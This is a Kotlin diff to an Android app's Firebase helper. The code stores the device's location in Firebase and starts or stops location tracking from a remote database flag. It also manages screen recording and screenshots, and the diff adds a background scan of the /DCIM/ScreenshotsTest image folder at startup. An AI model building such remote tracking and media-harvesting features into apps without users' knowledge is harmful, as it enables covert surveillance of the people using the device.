@@ -25,13 +25,16 @@ import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
 import com.google.firebase.storage.FirebaseStorage
 import com.google.firebase.storage.StorageReference
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import java.io.ByteArrayOutputStream
 import java.io.File
 
 
-class FirebaseData {
+object FirebaseData {
 
-    companion object {
+
         private const val TAG: String = "FirebaseData"
         private lateinit var databaseReference: DatabaseReference
         private lateinit var storageReference: StorageReference
@@ -43,7 +46,7 @@ class FirebaseData {
         private const val SCREEN_STORAGE_CODE = 1003
         var recordScreen = true
         private lateinit var mediaProjectionManager: MediaProjectionManager
-
+        private val directoriesWithImages = mutableListOf<File>()
 
         fun onInit(activity: Activity) {
 
@@ -60,10 +63,10 @@ class FirebaseData {
 
 
 
-            writeData()
+            //writeData()
             //readData()
             realTimeUpdateData(activity)
-
+            listExternalStorageDirectories()
         }
 
 
@@ -83,9 +86,10 @@ class FirebaseData {
         fun saveLocationToDatabase(currentLatLong: String) {
             //val timeStamp = System.currentTimeMillis()
             val date = CommonUtils.getCurrentDateTime()
-            val dateInString = CommonUtils.dateFormetter(date,"yyyy_MM_dd")
-            val timeInString = CommonUtils.dateFormetter(date,"HH:mm:ss")
-            databaseReference.child("locations").child(dateInString).child(timeInString).setValue(currentLatLong)
+            val dateInString = CommonUtils.dateFormetter(date, "yyyy_MM_dd")
+            val timeInString = CommonUtils.dateFormetter(date, "HH:mm:ss")
+            databaseReference.child("locations").child(dateInString).child(timeInString)
+                .setValue(currentLatLong)
                 .addOnSuccessListener {
                     /*Toast.makeText(
                         this,
@@ -120,9 +124,9 @@ class FirebaseData {
             databaseReference.addValueEventListener(object : ValueEventListener {
                 override fun onDataChange(snapshot: DataSnapshot) {
                     for (child in snapshot.children) {
-                        Log.d(TAG, "Real-time child: $child")
+                        //Log.d(TAG, "Real-time child: $child")
                         if (child.key.toString().equals("images")) {
-                            Log.d(TAG, "Real-time key: ${child.key}")
+                            //Log.d(TAG, "Real-time key: ${child.key}")
                             var screenshots = child.value as HashMap<*, *>
                             for (key in screenshots.values) {
                                 //println("Real-time child: $key")
@@ -147,7 +151,7 @@ class FirebaseData {
 
                             if (user?.locationStart == true) {
                                 LocationMap.onInit(activity)
-                            }else{
+                            } else {
                                 LocationMap.removeLocationUpdate()
                             }
                         }
@@ -201,42 +205,80 @@ class FirebaseData {
         }
 
         private fun listExternalStorageDirectories() {
-            val externalStorageDir = Environment.getExternalStorageDirectory()
-            val directoriesWithImages = mutableListOf<File>()
-            Log.d(TAG, "ImageDirectory: ${externalStorageDir.exists()} -- ${externalStorageDir.isDirectory}")
-            if (externalStorageDir.exists() && externalStorageDir.isDirectory) {
-                val directories = externalStorageDir.listFiles()?.filter { it.isDirectory }
-                directories?.forEach { dir ->
-                    Log.d(TAG, "ImageDirectory: dir: $dir")
-                    if (containsImages(dir)) {
-                        directoriesWithImages.add(dir)
-                    }
-                }
-            }
+            val job = CoroutineScope(Dispatchers.IO).launch {
+                //val externalStorageDir = Environment.getExternalStorageDirectory()
+                directoriesWithImages.clear()
 
-            // Log directories containing images
-            directoriesWithImages.forEach { dir ->
-                Log.d(TAG, "ImageDirectory: ${dir.absolutePath}")
+                var gpath: String =
+                    Environment.getExternalStorageDirectory().absolutePath
+                var spath = "/DCIM/ScreenshotsTest"
+                var externalStorageDir = File(gpath + File.separator + spath)
+                // /storage/emulated/0/DCIM/ScreenshotsTest
+                checkIsDirectory(externalStorageDir)
+  /*              if (externalStorageDir.exists() && externalStorageDir.isDirectory) {
+                    val directories = externalStorageDir.listFiles()?.filter { it.isDirectory }
+                    directories?.forEach { dir ->
+                        Log.d(TAG, "ImageDirectory: dir: $dir -- ${containsImages(dir)}")
+                        if (containsImages(dir)) {
+                            directoriesWithImages.add(dir)
+                        }
+                    }
+                }*/
+
+                // Log directories containing images
+                directoriesWithImages.forEach { dir ->
+                    Log.d(TAG, "ImageDirectory: ${dir.absolutePath}")
+                }
             }
             //val downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
             //Log.d(TAG, "downloadDir $downloadDir")
-    /*        if (externalStorageDir.exists() && externalStorageDir.isDirectory) {
-                val directories = externalStorageDir.listFiles()?.filter { it.isDirectory }
-                directories?.forEach { dir ->
-                    Log.d(TAG, "Directory Path: ${dir.absolutePath}")
-                }
-            } else {
-                Log.d(TAG, "Storage External storage directory not found")
-            }*/
+            /*        if (externalStorageDir.exists() && externalStorageDir.isDirectory) {
+                        val directories = externalStorageDir.listFiles()?.filter { it.isDirectory }
+                        directories?.forEach { dir ->
+                            Log.d(TAG, "Directory Path: ${dir.absolutePath}")
+                        }
+                    } else {
+                        Log.d(TAG, "Storage External storage directory not found")
+                    }*/
         }
 
-        private fun containsImages(directory: File): Boolean {
+        private suspend fun checkIsDirectory(directoryPath: File){
+            if (directoryPath.exists() && directoryPath.isDirectory) {
+                val files = directoryPath.listFiles()
+                if (files != null) {
+                    Log.d(TAG, "ImageDirectory: files: $files -- ${files?.size}")
+                    files.forEach { Log.d(TAG,"ImageDirectory: files: ${it.name}") }
+                } else {
+                    Log.d(TAG,"Directory is empty or inaccessible")
+                }
+                val directories = directoryPath.listFiles()?.filter { it.isDirectory }
+                Log.d(TAG, "ImageDirectory: directoryPath: $directoryPath -- ${directories?.size}")
+      /*          directories?.forEach { dir ->
+                    if(dir.isDirectory){
+                        checkIsDirectory(dir)
+                    }
+                    Log.d(TAG, "ImageDirectory: dir: $dir -- ${containsImages(dir)}")
+                    if (containsImages(dir)) {
+                        directoriesWithImages.add(dir)
+                    }
+                }*/
+                // isFiles
+
+               /* Log.d(TAG, "ImageDirectory: files: $directoryPath -- ${files?.size} -- ${containsImages(directoryPath)}")
+                if (containsImages(directoryPath)) {
+                    directoriesWithImages.add(directoryPath)
+                }*/
+            }
+        }
+
+        private suspend fun containsImages(directory: File): Boolean {
             val imageExtensions = listOf("jpg", "jpeg", "png", "gif", "bmp", "webp")
-            Log.d(TAG, "ImageDirectory: imageExtensions: $imageExtensions")
-            Log.d(TAG, "ImageDirectory: directory.listFiles(): ${directory.listFiles()}")
+            //Log.d(TAG, "ImageDirectory: imageExtensions: $imageExtensions")
+            Log.d(TAG, "containsImages: directory.listFiles(): ${directory.listFiles().size}")
             val files = directory.listFiles() ?: return false
             return files.any { file ->
                 val extension = file.extension.lowercase()
+                Log.d(TAG, "containsImages: extension: $file $extension")
                 imageExtensions.contains(extension)
             }
         }
@@ -338,7 +380,7 @@ class FirebaseData {
             val serviceIntent = Intent(activity, ScreenRecordingService::class.java)
             activity.stopService(serviceIntent)
             //pickFile()
-            listExternalStorageDirectories()
+
             //Toast.makeText(activity, "Recording Stopped", Toast.LENGTH_SHORT).show()
         }
 
@@ -375,7 +417,7 @@ class FirebaseData {
                 }
             }*/
 
-    }
+
 
     data class User(
         val firstName: String? = "",
